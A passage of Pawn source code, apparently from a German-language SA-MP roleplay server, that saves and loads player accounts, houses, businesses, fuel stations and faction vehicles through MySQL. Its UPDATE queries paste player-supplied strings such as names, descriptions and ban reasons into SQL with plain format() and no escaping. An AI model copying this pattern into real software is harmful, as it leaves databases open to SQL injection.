			PlayerInfo[playerid][pDrugsSkill],PlayerInfo[playerid][pCookSkill],PlayerInfo[playerid][pFishSkill],PlayerInfo[playerid][pSHealth],PlayerInfo[playerid][pHealth], PlayerInfo[playerid][Name]);
		//	mysql_function_query(mysqlcon,query, false, "", "");
		    mysql_pquery(mysqlcon,query,"");

	        format(query, sizeof(query), "UPDATE `accounts` SET carlic = '%d',flylic = '%d',boatlic = '%d',fishlic = '%d',gunlic = '%d',lkwlic = '%d',motolic = '%d' WHERE `name` = '%s'",
            PlayerInfo[playerid][pCarLic],PlayerInfo[playerid][pFlyLic],PlayerInfo[playerid][pBoatLic],
			PlayerInfo[playerid][pFishLic],PlayerInfo[playerid][pGunLic],PlayerInfo[playerid][pLKWLic],PlayerInfo[playerid][pMotoLic], PlayerInfo[playerid][Name]);
		//	mysql_function_query(mysqlcon,query, false, "", "");
		    mysql_pquery(mysqlcon,query,"");

	        format(query, sizeof(query), "UPDATE `accounts` SET zig = '%d',gun1 = '%d',gun2 = '%d',gun3 = '%d',gun4 = '%d',ammo1 = '%d',ammo2 = '%d',ammo3 = '%d',ammo4 = '%d',mulltime = '%d' WHERE `name` = '%s'",
			PlayerInfo[playerid][pZig],PlayerInfo[playerid][pGun1],PlayerInfo[playerid][pGun2],PlayerInfo[playerid][pGun3],PlayerInfo[playerid][pGun4],
			PlayerInfo[playerid][pAmmo1],PlayerInfo[playerid][pAmmo2],PlayerInfo[playerid][pAmmo3],PlayerInfo[playerid][pAmmo4],PlayerInfo[playerid][pMulltime], PlayerInfo[playerid][Name]);
		//	mysql_function_query(mysqlcon,query, false, "", "");
		    mysql_pquery(mysqlcon,query,"");

	        format(query, sizeof(query), "UPDATE `accounts` SET playminutes = '%d',gesamtminutes = '%d',minutessincean = '%d',fraksperre = '%d',gehalt = '%d',invweapon = '%d',invammo = '%d',invweapon2 = '%d',invammo2 = '%d',invmats = '%d' WHERE `name` = '%s'",
			PlayerInfo[playerid][pPlayMinutes],PlayerInfo[playerid][pGesamtMinutes],PlayerInfo[playerid][pMinutesSinceAn],PlayerInfo[playerid][pFrakSperre],PlayerInfo[playerid][pGehalt],
			PlayerInfo[playerid][pInvWeapon],PlayerInfo[playerid][pInvAmmo],PlayerInfo[playerid][pInvWeapon2],PlayerInfo[playerid][pInvAmmo2],PlayerInfo[playerid][pInvMats], PlayerInfo[playerid][Name]);
		//	mysql_function_query(mysqlcon,query, false, "", "");
		    mysql_pquery(mysqlcon,query,"");

	        format(query, sizeof(query), "UPDATE `accounts` SET invdrugs = '%d',flugtime = '%d',farmtime = '%d',gdeaths = '%d',gkills = '%d',gwd = '%d',erstehilfe = '%d',meldung = '%d',hitsound = '%d',ptankekey = '%d' WHERE `name` = '%s'",
			PlayerInfo[playerid][pInvDrugs],PlayerInfo[playerid][pFlugTime],PlayerInfo[playerid][pFarmTime],PlayerInfo[playerid][pGDeaths],PlayerInfo[playerid][pGKills],
			PlayerInfo[playerid][pGWD],PlayerInfo[playerid][pErstehilfe],PlayerInfo[playerid][pMeldung],PlayerInfo[playerid][pHitsound],PlayerInfo[playerid][pPtankekey], PlayerInfo[playerid][Name]);
		//	mysql_function_query(mysqlcon,query, false, "", "");
		    mysql_pquery(mysqlcon,query,"");

		    format(query, sizeof(query), "UPDATE `accounts` SET paydayhad = '%d',wins = '%d',loses = '%d',miserperk = '%d',painperk = '%d',traderperk = '%d',warns = '%d',adjustable = '%d',married = '%d' WHERE `name` = '%s'",
			PlayerInfo[playerid][pPayDayHad],PlayerInfo[playerid][pWins],PlayerInfo[playerid][pLoses],PlayerInfo[playerid][pMiserPerk],
			PlayerInfo[playerid][pPainPerk],PlayerInfo[playerid][pTraderPerk],PlayerInfo[playerid][pWarns],PlayerInfo[playerid][pAdjustable],PlayerInfo[playerid][pMarried], PlayerInfo[playerid][Name]);
	//		mysql_function_query(mysqlcon,query, false, "", "");
	        mysql_pquery(mysqlcon,query,"");

	        format(query, sizeof(query), "UPDATE `accounts` SET pos_z = '%d',zollpass = '%d',pos_y = '%d',gebannt = '%d',pcarp = '%d' WHERE `name` = '%s'",
			PlayerInfo[playerid][pPos_z],PlayerInfo[playerid][pZollPass],PlayerInfo[playerid][pPos_y],PlayerInfo[playerid][pGebannt],PlayerInfo[playerid][pCarP],PlayerInfo[playerid][Name]);
		//	mysql_function_query(mysqlcon,query, false, "", "");
			mysql_pquery(mysqlcon,query,"");

	        format(query, sizeof(query), "UPDATE `accounts` SET boxmats = '%d',boxdrugs = '%d',leader = '%d',member = '%d',smember = '%d',rank = '%d', pSpielerWiederbelebt='%d' WHERE `name` = '%s'",
			PlayerInfo[playerid][pBoxMats],PlayerInfo[playerid][pBoxDrugs],PlayerInfo[playerid][pLeader],PlayerInfo[playerid][pMember],
			PlayerInfo[playerid][sMember],PlayerInfo[playerid][pRank], PlayerInfo[playerid][pSpielerWiederbelebt],PlayerInfo[playerid][Name]);
		//	mysql_function_query(mysqlcon,query, false, "", "");
		    mysql_pquery(mysqlcon,query,"");

		    format(query, sizeof(query), "UPDATE `accounts` SET pnumber = '%d',phousekey = '%d',pbiskey = '%d',handygeld = '%d',pos_x = '%d',IsPlayerProjektleiter = '%d',prisoncps = '%d' WHERE `name` = '%s'",
			PlayerInfo[playerid][pPnumber],PlayerInfo[playerid][pHouseKey],PlayerInfo[playerid][pPbiskey],PlayerInfo[playerid][pHandyGeld],PlayerInfo[playerid][pPos_x],PlayerInfo[playerid][pIsPlayerProjektleiter],PlayerInfo[playerid][pPrisonCPs],PlayerInfo[playerid][Name]);//pIsPlayerProjektleiter
	//		mysql_function_query(mysqlcon,query, false, "", "");
	        mysql_pquery(mysqlcon,query,"");

		    format(query, sizeof(query), "UPDATE `accounts` SET `int` = '%d',`local` = '%d',`team` = '%d',`model` = '%d',`char` = '%d',`contracttime` = '%d',`detskill` = '%d',`payday` = '%d',`ichmusskuedigen` = '%d' WHERE `name` = '%s'",
            PlayerInfo[playerid][pInt],PlayerInfo[playerid][pLocal],PlayerInfo[playerid][pTeam],PlayerInfo[playerid][pModel],PlayerInfo[playerid][pChar],PlayerInfo[playerid][pContractTime],PlayerInfo[playerid][pDetSkill],PlayerInfo[playerid][pPayDay],PlayerInfo[playerid][pichmusskuedigen],PlayerInfo[playerid][Name]);
		//	mysql_function_query(mysqlcon,query, false, "", "");
		    mysql_pquery(mysqlcon,query,"");

		    format(query, sizeof(query), "UPDATE `accounts` SET wantedpoints = '%d',wantedlevel = '%d',offlineflucht = '%d',ownperso = '%d',spawnchange = '%d',`premium` = '%d',`amuted` = '%d',`amutedtime` = '%d',`orgmember` = '%d',`orgrang` = '%d',`AdminPasswort` = '%d',`orgleader` = '%d' WHERE `name` = '%s'",
            WantedPoints[playerid],WantedLevel[playerid],OfflineFlucht[playerid],PlayerInfo[playerid][pOwnPerso],SpawnChange[playerid],PlayerInfo[playerid][pDonateRank],PlayerInfo[playerid][paMuted],PlayerInfo[playerid][paMutedTime],PlayerInfo[playerid][pOrgMember],PlayerInfo[playerid][pOrgRang],PlayerInfo[playerid][pAdminPasswort],PlayerInfo[playerid][pOrgLeader],PlayerInfo[playerid][Name]);
		//	mysql_function_query(mysqlcon,query, false, "", "");
			mysql_pquery(mysqlcon,query,"");

			format(query, sizeof(query), "UPDATE `accounts` SET mutedtime = '%d',prison = '%d',admintickets = '%d',tottime = '%d',tot = '%d',marriedto = '%s',fuel = '%d',verreckt = '%d',bangrund = '%s',banadmin = '%s',bandauer = '%s',helm = '%d',weather = '%d',carkeys = '%d',fightingstyle = '%d' WHERE `name` = '%s'",
			PlayerInfo[playerid][pMutedTime],PlayerInfo[playerid][pPrison],PlayerInfo[playerid][pAdminTickets],PlayerInfo[playerid][pTotTime],PlayerInfo[playerid][pTot],PlayerInfo[playerid][pMarriedTo],PlayerInfo[playerid][pFuel],PlayerInfo[playerid][pVerreckt],PlayerInfo[playerid][pBanGrund],PlayerInfo[playerid][pBanAdmin],PlayerInfo[playerid][pBanDauer],PlayerInfo[playerid][pHelm],PlayerInfo[playerid][pWeather],PlayerInfo[playerid][pCarkeys],PlayerInfo[playerid][pFightingStyle],PlayerInfo[playerid][Name]);
		//	mysql_function_query(mysqlcon,query, false, "", "");
		    mysql_pquery(mysqlcon,query,"");




		/*	format(query, sizeof(query), "UPDATE `accounts` SET phousekey1 = '%d',phousekey2 = '%d',phousekey3 = '%d',phousekey4 = '%d' WHERE `name` = '%s'",
			PlayerInfo[playerid][pHouseKey1],PlayerInfo[playerid][pHouseKey2],PlayerInfo[playerid][pHouseKey3],PlayerInfo[playerid][pHouseKey4],PlayerInfo[playerid][Name]);
			mysql_function_query(mysqlcon,query, false, "", "");*/
			return 1;
		}
	}
	return 1;
}




stock Get2DZone(Float:x, Float:y, zone[], len)
{

 	for(new i = 0; i != sizeof(SA_GPS_ZONE_NAMES); i++ ){
	if(x >= SA_GPS_ZONE_NAMES[i][Zone_Area][0] && x <= SA_GPS_ZONE_NAMES[i][Zone_Area][3] && y >= SA_GPS_ZONE_NAMES[i][Zone_Area][1] && y <= SA_GPS_ZONE_NAMES[i][Zone_Area][4])
	{
	return format(zone, len, SA_GPS_ZONE_NAMES[i][Zone_Name], 0);}
	}
	return 0;
}



stock GetPlayer2DZone(playerid, zone[], len)
{
	new Float:x, Float:y, Float:z;
	GetPlayerPos(playerid, x, y, z);
 	for(new i = 0; i != sizeof(SA_GPS_ZONE_NAMES); i++ ){
	if(x >= SA_GPS_ZONE_NAMES[i][Zone_Area][0] && x <= SA_GPS_ZONE_NAMES[i][Zone_Area][3] && y >= SA_GPS_ZONE_NAMES[i][Zone_Area][1] && y <= SA_GPS_ZONE_NAMES[i][Zone_Area][4])
	{
	return format(zone, len, SA_GPS_ZONE_NAMES[i][Zone_Name], 0);}
	}
	return 0;
}
public SaveProperty(h)
{
	new query[1024],k[128];
    format(query,sizeof(query),"UPDATE `houses` SET `hcreated` = '%i' ,`hentrancex` = '%f' ,`hentrancey` = '%f' ,`hentrancez` = '%f' ,`hexitx` = '%f', `hexity` = '%f', `hexitz` = '%f' WHERE `houseid`='%i'",
	HouseInfo[h][hCreated],HouseInfo[h][hEntrancex],HouseInfo[h][hEntrancey],HouseInfo[h][hEntrancez],HouseInfo[h][hExitx],HouseInfo[h][hExity],HouseInfo[h][hExitz], h);
//	mysql_function_query(mysqlcon,query, false, "", "");
    mysql_pquery(mysqlcon,query,"");

	format(query,sizeof(query),"UPDATE `houses` SET `howner` = '%s',`hdiscription` = '%s', `hvalue` = '%i',`hhel` = '%i' WHERE `houseid`='%i'",
	HouseInfo[h][hOwner], HouseInfo[h][hDiscription],HouseInfo[h][hValue],HouseInfo[h][hHel], h);
//	mysql_function_query(mysqlcon,query, false, "", "");
    mysql_pquery(mysqlcon,query,"");

	format(query,sizeof(query),"UPDATE `houses` SET `harm` = '%i',`hint` = '%i',`hlock` = '%i',`howned` = '%i',`hrooms` = '%i',`hrent` = '%i',`hrentabil` = '%i',`htakings` = '%i',`hdate` = '%i',`hlevel` = '%i' WHERE `houseid`='%i'",
	HouseInfo[h][hArm],HouseInfo[h][hInt],HouseInfo[h][hLock],HouseInfo[h][hOwned],HouseInfo[h][hRooms],HouseInfo[h][hRent],HouseInfo[h][hRentabil],HouseInfo[h][hTakings],HouseInfo[h][hDate],HouseInfo[h][hLevel], h);
//	mysql_function_query(mysqlcon,query, false, "", "");
    mysql_pquery(mysqlcon,query,"");

    if(HouseInfo[h][hOwned] == 0)
	{
    	format(k, sizeof(k), "==== [HausID: %d] ====\nBesitzer: %s\nBeschreibung: %s\nPreis: %d$\nMiete: %d$\n/buyhouse zum kaufen",h,HouseInfo[h][hOwner],HouseInfo[h][hDiscription],HouseInfo[h][hValue],HouseInfo[h][hRent]);
 	    Update3DTextLabelText(HouseInfo[h][h_text],0x0091FFFF,k);
	}
	if(HouseInfo[h][hOwned] == 1)
	{
		format(k, sizeof(k), "==== [HausID: %d] ====\nBesitzer: %s\nBeschreibung: %s\nPreis: %d$\nMiete: %d$\nEinmieten mit /renthouse",h,HouseInfo[h][hOwner],HouseInfo[h][hDiscription],HouseInfo[h][hValue],HouseInfo[h][hRent]);
 	    Update3DTextLabelText(HouseInfo[h][h_text],0x0091FFFF,k);
	}
    return 1;
}
stock OnPropUpdate_b(idx)
{
    new query[1024],g[128];
	format(query,sizeof(query),"UPDATE `bizz` SET `btyp` = '%i',`bcreated` = '%i',`bowned` = '%i' ,`bowner` = '%s' ,`bmessage` = '%s' ,`bextortion` = '%s' ,`bentrancex` = '%f', `bentrancey` = '%f', `bentrancez` = '%f', `bexitx` = '%f' WHERE `id`='%i'",BizzInfo[idx][bTyp],BizzInfo[idx][bCreated],BizzInfo[idx][bOwned],BizzInfo[idx][bOwner],BizzInfo[idx][bMessage],BizzInfo[idx][bExtortion], BizzInfo[idx][bEntranceX],BizzInfo[idx][bEntranceY],BizzInfo[idx][bEntranceZ],BizzInfo[idx][bExitX],idx);
//	mysql_function_query(mysqlcon,query, false, "", "");
    mysql_pquery(mysqlcon,query,"");

	format(query,sizeof(query),"UPDATE `bizz` SET `bexity` = '%f',`bexitz` = '%f',`bexitr` = '%f', `blevelneeded` = '%i', `bbuyprice` = '%i', `bentrancecost` = '%i', `btill` = '%d',`blocked` = '%d', `binterior` = '%i',`bproducts` = '%i' WHERE `id`='%i'",BizzInfo[idx][bExitY],BizzInfo[idx][bExitZ],BizzInfo[idx][bExitR],BizzInfo[idx][bLevelNeeded],BizzInfo[idx][bBuyPrice],BizzInfo[idx][bEntranceCost],BizzInfo[idx][bTill],BizzInfo[idx][bLocked],BizzInfo[idx][bInterior],BizzInfo[idx][bProducts],idx);
	//mysql_function_query(mysqlcon,query, false, "", "");
	mysql_pquery(mysqlcon,query,"");

	format(query,sizeof(query),"UPDATE `bizz` SET `bmaxproducts` = '%i',`bpriceprod` = '%i',`bdate` = '%i' WHERE `id`='%i'",BizzInfo[idx][bMaxProducts],BizzInfo[idx][bPriceProd],BizzInfo[idx][bDate],idx);
//	mysql_function_query(mysqlcon,query, false, "", "");//bRobMarker`brobmarker` = '%i',`brobx` = '%f',`broby` = '%f',`brobz` = '%f',BizzInfo[idx][bRobMarker],BizzInfo[idx][bRobx],BizzInfo[idx][bRoby],BizzInfo[idx][bRobz]
    mysql_pquery(mysqlcon,query,"");

	format(g, sizeof(g), "==== [Bizz ID: %d] ====\nName: %s\nBesitzer: %s\nErpresser: %s\nPreis: %d$\nEintritt: %d$\nProdukte: %d / %d",idx,BizzInfo[idx][bMessage],BizzInfo[idx][bOwner],BizzInfo[idx][bExtortion],BizzInfo[idx][bBuyPrice],BizzInfo[idx][bEntranceCost],BizzInfo[idx][bProducts],BizzInfo[idx][bMaxProducts]);
    Update3DTextLabelText(BizzInfo[idx][B_text],0x0091FFFF,g);
}
stock OnPropUpdate_sb(idx)
{
	new query[1024],f[128];
	format(query,sizeof(query),"UPDATE `sbizz` SET `sbcreated` = '%i',`sbowned` = '%i' ,`sbowner` = '%s' ,`sbmessage` = '%s' ,`sbextortion` = '%s' ,`sbentrancex` = '%f', `sbentrancey` = '%f', `sbentrancez` = '%f' WHERE `sid`='%i'",SBizzInfo[idx][sbCreated],SBizzInfo[idx][sbOwned],SBizzInfo[idx][sbOwner],SBizzInfo[idx][sbMessage],SBizzInfo[idx][sbExtortion], SBizzInfo[idx][sbEntranceX],SBizzInfo[idx][sbEntranceY],SBizzInfo[idx][sbEntranceZ],idx);
//	mysql_function_query(mysqlcon,query, false, "", "");
    mysql_pquery(mysqlcon,query,"");

	format(query,sizeof(query),"UPDATE `sbizz` SET `sblevelneeded` = '%i', `sbbuyprice` = '%i', `sbentrancecost` = '%i', `sbtill` = '%d',`sblocked` = '%d', `sbinterior` = '%i',`sbproducts` = '%i' WHERE `sid`='%i'",SBizzInfo[idx][sbLevelNeeded],SBizzInfo[idx][sbBuyPrice],SBizzInfo[idx][sbEntranceCost],SBizzInfo[idx][sbTill],SBizzInfo[idx][sbLocked],SBizzInfo[idx][sbInterior],SBizzInfo[idx][sbProducts],idx);
//	mysql_function_query(mysqlcon,query, false, "", "");
    mysql_pquery(mysqlcon,query,"");

	format(query,sizeof(query),"UPDATE `sbizz` SET `sbmaxproducts` = '%i',`sbpriceprod` = '%i',`sbdate` = '%i' WHERE `sid`='%i'",SBizzInfo[idx][sbMaxProducts],SBizzInfo[idx][sbPriceProd],SBizzInfo[idx][sbDate],idx);
//	mysql_function_query(mysqlcon,query, false, "", "");
    mysql_pquery(mysqlcon,query,"");

	format(f, sizeof(f), "==== [sBizz ID: %d] ====\nName: %s\nBesitzer: %s\nPreis: %d$\nEintritt: %d$\nProdukte: %d / %d",idx,SBizzInfo[idx][sbMessage],SBizzInfo[idx][sbOwner],SBizzInfo[idx][sbBuyPrice],SBizzInfo[idx][sbEntranceCost],SBizzInfo[idx][sbProducts],SBizzInfo[idx][sbMaxProducts]);
    Update3DTextLabelText(SBizzInfo[idx][sB_text],0x0091FFFF,f);
}
stock OnPropUpdate_t(idx)
{
    new query[1024],a[128];
	format(query,sizeof(query),"UPDATE `fuelstation` SET `tcreated` = '%i', `towned` = '%i' ,`towner` = '%s' ,`tmessage` = '%s' ,`textortion` = '%s' ,`tentrancex` = '%f', `tentrancey` = '%f', `tentrancez` = '%f', `tlevelneeded` = '%i' WHERE `id`='%i'",TankeInfo[idx][tCreated],TankeInfo[idx][tOwned],TankeInfo[idx][tOwner],TankeInfo[idx][tMessage],TankeInfo[idx][tExtortion], TankeInfo[idx][tEntranceX],TankeInfo[idx][tEntranceY],TankeInfo[idx][tEntranceZ],TankeInfo[idx][tLevelNeeded],idx);
//	mysql_function_query(mysqlcon,query, false, "", "");
    mysql_pquery(mysqlcon,query,"");

	format(query,sizeof(query),"UPDATE `fuelstation` SET `tbuyprice` = '%i',`tentrancecost` = '%i',`ttill` = '%d', `tlocked` = '%d', `tinterior` = '%i', `tproducts` = '%i', `tmaxproducts` = '%d',`tpriceprod` = '%d' WHERE `id`='%i'",TankeInfo[idx][tBuyPrice],TankeInfo[idx][tEntranceCost],TankeInfo[idx][tTill],TankeInfo[idx][tLocked],TankeInfo[idx][tInterior],TankeInfo[idx][tProducts],TankeInfo[idx][tMaxProducts],TankeInfo[idx][tPriceProd],idx);
//	mysql_function_query(mysqlcon,query, false, "", "");
    mysql_pquery(mysqlcon,query,"");

	if(TankeInfo[idx][tOwned] == 0)
	{
		format(a, sizeof(a), "%s\nDiese Tankstelle steht zum Verkauf!\nPreis: $%d \nLevel: %d \nBenutze /buytanke um dir die Tankstelle zu kaufen",TankeInfo[idx][tMessage],TankeInfo[idx][tBuyPrice],TankeInfo[idx][tLevelNeeded]);
	    Update3DTextLabelText(TankeInfo[idx][t_text],0xFFFFFFAA,a);
	}
	else
	{
	    format(a, sizeof(a), "%s\nInhaber: %s\nTeilhaber: %s\nPreis pro Liter: $%d \nBenzinlager: %d\nLevel: %d\n\nTanken mit /fill",TankeInfo[idx][tMessage],TankeInfo[idx][tOwner],TankeInfo[idx][tExtortion],TankeInfo[idx][tEntranceCost],TankeInfo[idx][tProducts],TankeInfo[idx][tLevelNeeded]);
	    Update3DTextLabelText(TankeInfo[idx][t_text],0xFFFFFFAA,a);
	}
}


stock OnPropUpdate_f(idx)
{
    new query[1024];//,a[128];
	format(query,sizeof(query),"UPDATE `frakbase` SET `fcreated` = '%i', `tmessage` = '%s' ,`tentrancex` = '%f' ,`tentrancey` = '%f' ,`tentrancez` = '%f' ,`fexitx` = '%f', `fexity` = '%f', `fexitz` = '%f', `finterior` = '%i' WHERE `id`='%i'",FrakInfo[idx][fCreated],FrakInfo[idx][fMessage],FrakInfo[idx][fEntranceX],FrakInfo[idx][fEntranceY],FrakInfo[idx][fEntranceZ],FrakInfo[idx][fExitX],FrakInfo[idx][fExitY],FrakInfo[idx][fExitZ],FrakInfo[idx][fInterior],idx);
//	mysql_function_query(mysqlcon,query, false, "", "");
    mysql_pquery(mysqlcon,query,"");




	format(query,sizeof(query),"UPDATE `frakbase` SET `ffrak` = '%i',`fopen` = '%i',`tdrugprice` = '%d', `tmatsprice` = '%d', `tmats` = '%i', `tdrugs` = '%i' WHERE `id`='%i'",FrakInfo[idx][fFrak],FrakInfo[idx][fOpen],FrakInfo[idx][fDrugsPrice],FrakInfo[idx][fMatsPrice],FrakInfo[idx][fMats],FrakInfo[idx][fDrugs],idx);
//	mysql_function_query(mysqlcon,query, false, "", "");
    mysql_pquery(mysqlcon,query,"");

	if(FrakInfo[idx][fCreated] == 1)
	{
		format(frakbasetring, sizeof(frakbasetring), "Fraktionsbase %d\n\n%s",idx,FrakInfo[idx][fMessage]);
		Update3DTextLabelText(FrakInfo[idx][f_text],0xFFFFFFAA,frakbasetring);
	}


/*
	if(TankeInfo[idx][tOwned] == 0)
	{
		format(a, sizeof(a), "%s\nDiese Tankstelle steht zum Verkauf!\nPreis: $%d \nLevel: %d \nBenutze /buytanke um dir die Tankstelle zu kaufen",TankeInfo[idx][tMessage],TankeInfo[idx][tBuyPrice],TankeInfo[idx][tLevelNeeded]);
	    Update3DTextLabelText(TankeInfo[idx][t_text],0xFFFFFFAA,a);
	}
	else
	{
	    format(a, sizeof(a), "%s\nInhaber: %s\nTeilhaber: %s\nPreis pro Liter: $%d \nBenzinlager: %d\nLevel: %d\n\nTanken mit /fill",TankeInfo[idx][tMessage],TankeInfo[idx][tOwner],TankeInfo[idx][tExtortion],TankeInfo[idx][tEntranceCost],TankeInfo[idx][tProducts],TankeInfo[idx][tLevelNeeded]);
	    Update3DTextLabelText(TankeInfo[idx][t_text],0xFFFFFFAA,a);
	}
*/
}



/*
stock FreeHouseCheck()
{
         new bedin[128],query[128];
         for(new i;i<MAX_HOUSE;i++)
        {
         format(bedin,sizeof(bedin),"houseid='%i'",i);
         mysql_format(handle,query,sizeof(query),"SELECT * FROM houses WHERE %s",bedin);
          mysql_query(handle,query);
         //mysql_store_result();
         new field_name[32];
   		 cache_get_field_name(0, field_name);
         new rows;cache_get_row_count(rows);if(rows == 0) return i;
  }
  return 0;
}
*/




forward LoadORGAutos();
public LoadORGAutos()
{
    new query[128];

//	format(query,sizeof(query),"SELECT * FROM `orgautos`");
//	mysql_function_query(mysqlcon,query, true, "LoadORGAutosNow", "i",idx);

    format(query,sizeof(query),"SELECT * FROM `orgautos`");
//	mysql_function_query(mysqlcon,query, true, "LoadORGAutosNow", "");
	//mysql_pquery(mysqlcon,query,"");
	mysql_pquery(mysqlcon, query, "LoadORGAutosNow", "");
	return 1;
}




forward LoadFrakAutosNOW();
public LoadFrakAutosNOW()
{
    new query[128];

//	format(query,sizeof(query),"SELECT * FROM `orgautos`");
//	mysql_function_query(mysqlcon,query, true, "LoadORGAutosNow", "i",idx);

    format(query,sizeof(query),"SELECT * FROM `FraktionsVehikels`");

//	mysql_pquery(mysqlcon, query, "LoadFactionCars", "");
    mysql_pquery(mysqlcon, query, "LoadFactionCars");
	return 1;
}


forward LoadORGAutosNow();
public LoadORGAutosNow()
{
    new rows; /*temp[128],*/
//	cache_get_data(rows,fields);
    cache_get_row_count(rows);
	if(rows)
	{
	    for(new i; i<rows; i++)
    	{
	 //   cache_get_field_content(i,"autoid",temp), OrgAuto[idx][orgautodbid] = strval(temp);
//     	cache_get_field_content(i,"orgvehtype",temp), OrgAuto[idx][orgvehtype] = strval(temp);

     //	cache_get_field_content(i,"orgid",temp), OrgAuto[idx][autoorgid] = strval(temp);

     	new idx = getFreeorgautoid();
     	cache_get_value_name_int(i, "autoid", OrgAuto[idx][orgautodbid]);
     	cache_get_value_name_int(i, "orgvehtype", OrgAuto[idx][orgvehtype]);
     	cache_get_value_name_int(i, "orgid", OrgAuto[idx][autoorgid]);


     	cache_get_value_name_float(i, "orgautox", OrgAuto[idx][orgautox]);
     	cache_get_value_name_float(i, "orgautoy", OrgAuto[idx][orgautoy]);
     	cache_get_value_name_float(i, "orgautoz", OrgAuto[idx][orgautoz]);
     	cache_get_value_name_float(i, "orgautor", OrgAuto[idx][orgautor]);

     	/*
	    cache_get_field_content(i,"orgautox",temp), OrgAuto[idx][orgautox] = floatstr(temp); //floats
	    cache_get_field_content(i,"orgautoy",temp), OrgAuto[idx][orgautoy] = floatstr(temp);
	    cache_get_field_content(i,"orgautoz",temp), OrgAuto[idx][orgautoz] = floatstr(temp);
	    cache_get_field_content(i,"orgautor",temp), OrgAuto[idx][orgautor] = floatstr(temp);*/




	  //  cache_get_field_content(0,"howner",temp), HouseInfo[idx][hOwner] = temp;
	 //   cache_get_field_content(0,"hdiscription",temp), HouseInfo[idx][hDiscription] = temp;



	 //   cache_get_field_content(i,"orgautocolor",temp), OrgAuto[idx][orgautocolor] = strval(temp);
	  //  cache_get_field_content(i,"orgautocolor2",temp), OrgAuto[idx][orgautocolor2] = strval(temp);
	   	//cache_get_field_content(i,"orgautokaufpreis",temp), OrgAuto[idx][orgautokaufpreis] = strval(temp);

	   	cache_get_value_name_int(i, "orgautocolor", OrgAuto[idx][orgautocolor]);
     	cache_get_value_name_int(i, "orgautocolor2", OrgAuto[idx][orgautocolor2]);
     	cache_get_value_name_int(i, "orgautokaufpreis", OrgAuto[idx][orgautokaufpreis]);


	   	OrgAuto[idx][LocalID] = CreateVehicle(OrgAuto[idx][orgvehtype],OrgAuto[idx][orgautox],OrgAuto[idx][orgautoy],OrgAuto[idx][orgautoz],OrgAuto[idx][orgautor],OrgAuto[idx][orgautocolor],OrgAuto[idx][orgautocolor2],-1,0);

	   	OrgInfo[OrgAuto[idx][autoorgid]][FahrzeugeRows]++;
	   	}
	   	return 1;



	}
	return 1;
	 // richtig ? i thin schon
}






public LoadProperty()
{
    new query[128];
    for(new idx=0; idx<sizeof(HouseInfo); idx++)
    {
	    format(query,sizeof(query),"SELECT * FROM `houses` WHERE `houseid`='%i'",idx);
//	    mysql_function_query(mysqlcon,query, true, "LoadMysqlHouses", "i",idx);
        mysql_pquery(mysqlcon, query, "LoadMysqlHouses", "i",idx);
	}
//	print("Häuser geladen!");
	return 1;
}
forward LoadMysqlHouses(idx);
public LoadMysqlHouses(idx)
{
	new rows,string[128];
//	cache_get_data(rows,fields);
    cache_get_row_count(rows);
	if(rows)
	{/*
	    cache_get_field_content(0,"hcreated",temp), HouseInfo[idx][hCreated] = strval(temp);
	    cache_get_field_content(0,"hentrancex",temp), HouseInfo[idx][hEntrancex] = floatstr(temp);
	    cache_get_field_content(0,"hentrancey",temp), HouseInfo[idx][hEntrancey] = floatstr(temp);
	    cache_get_field_content(0,"hentrancez",temp), HouseInfo[idx][hEntrancez] = floatstr(temp);
	    cache_get_field_content(0,"hexitx",temp), HouseInfo[idx][hExitx] = floatstr(temp);
	    cache_get_field_content(0,"hexity",temp), HouseInfo[idx][hExity] = floatstr(temp);
	    cache_get_field_content(0,"hexitz",temp), HouseInfo[idx][hExitz] = floatstr(temp);
	    cache_get_field_content(0,"howner",temp), HouseInfo[idx][hOwner] = temp;
	    cache_get_field_content(0,"hdiscription",temp), HouseInfo[idx][hDiscription] = temp;
	    cache_get_field_content(0,"hvalue",temp), HouseInfo[idx][hValue] = strval(temp);
	    cache_get_field_content(0,"hhel",temp), HouseInfo[idx][hHel] = strval(temp);
	    cache_get_field_content(0,"harm",temp), HouseInfo[idx][hArm] = strval(temp);
	    cache_get_field_content(0,"hint",temp), HouseInfo[idx][hInt] = strval(temp);
	    cache_get_field_content(0,"hlock",temp), HouseInfo[idx][hLock] = strval(temp);
	    cache_get_field_content(0,"howned",temp), HouseInfo[idx][hOwned] = strval(temp);
	    cache_get_field_content(0,"hrooms",temp), HouseInfo[idx][hRooms] = strval(temp);
	    cache_get_field_content(0,"hrent",temp), HouseInfo[idx][hRent] = strval(temp);
	    cache_get_field_content(0,"hrentabil",temp), HouseInfo[idx][hRentabil] = strval(temp);
	    cache_get_field_content(0,"hdate",temp), HouseInfo[idx][hDate] = strval(temp);
	    cache_get_field_content(0,"hlevel",temp), HouseInfo[idx][hLevel] = strval(temp);*/



	    cache_get_value_name_int(0, "hcreated", HouseInfo[idx][hCreated]);
        cache_get_value_name_float(0, "hentrancex", HouseInfo[idx][hEntrancex]);
        cache_get_value_name_float(0, "hentrancey", HouseInfo[idx][hEntrancey]);
        cache_get_value_name_float(0, "hentrancez", HouseInfo[idx][hEntrancez]);
        cache_get_value_name_float(0, "hexitx", HouseInfo[idx][hExitx]);
        cache_get_value_name_float(0, "hexity", HouseInfo[idx][hExity]);
        cache_get_value_name_float(0, "hexitz", HouseInfo[idx][hExitz]);

        cache_get_value_name(0, "howner", HouseInfo[idx][hOwner], MAX_PLAYER_NAME);
        cache_get_value_name(0, "hdiscription", HouseInfo[idx][hDiscription], MAX_PLAYER_NAME);  // hDiscription Länge?


		cache_get_value_name_int(0, "hvalue", HouseInfo[idx][hValue]);


	    cache_get_value_name_int(0, "hhel", HouseInfo[idx][hHel]);
	    cache_get_value_name_int(0, "harm", HouseInfo[idx][hArm]);
	    cache_get_value_name_int(0, "hint", HouseInfo[idx][hInt]);
		cache_get_value_name_int(0, "hlock", HouseInfo[idx][hLock]);
		cache_get_value_name_int(0, "howned", HouseInfo[idx][hOwned]);


	    cache_get_value_name_int(0, "hrooms", HouseInfo[idx][hRooms]);
	    cache_get_value_name_int(0, "hrent", HouseInfo[idx][hRent]);
	    cache_get_value_name_int(0, "hrentabil", HouseInfo[idx][hRentabil]);
		cache_get_value_name_int(0, "hdate", HouseInfo[idx][hDate]);
		cache_get_value_name_int(0, "hlevel", HouseInfo[idx][hLevel]);


//	    format(string2,sizeof(string2),"Haus ID: %i Erstellt: %i Besitzer: %s X: %f Y: %f Z: %f",idx,HouseInfo[idx][hCreated],HouseInfo[idx][hOwner],HouseInfo[idx][hEntrancex],HouseInfo[idx][hEntrancey],HouseInfo[idx][hEntrancez]);
